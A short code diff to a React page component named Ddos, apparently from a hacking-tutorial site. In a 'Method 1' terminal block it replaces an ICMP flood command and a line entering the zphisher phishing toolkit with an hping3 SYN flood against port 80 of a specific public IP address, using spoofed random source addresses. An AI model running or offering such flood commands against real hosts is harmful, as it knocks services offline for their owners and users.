@@ -59,8 +59,7 @@ export default function Ddos() {
         {/* Method 1 */}
         <div className="bg-gradient-to-r from-black to-[#003706] text-white rounded-xl flex flex-col justify-center gap-5 md:gap-10 shadow-xl px-3 py-5 mb-5 mx-3 lg:mb-20 lg:py-16 lg:px-28">
           <h1 className="font-juli text-3xl md:text-5xl">Method 1:</h1>
-          <Terminal text="sudo hping3 -1 —flood 192.168.0.113"></Terminal>
-          <Terminal text="cd zphisher"></Terminal>
+          <Terminal text="sudo hping3 --flood -p 80 --rand-source 137.74.187.102"></Terminal>
           <img src={a1} alt="terminal" className="my-5 md:max-w-2xl" />
 
           <h2 className="font-lec font-bold text-[#F2F603] text-sm lg:text-2xl">
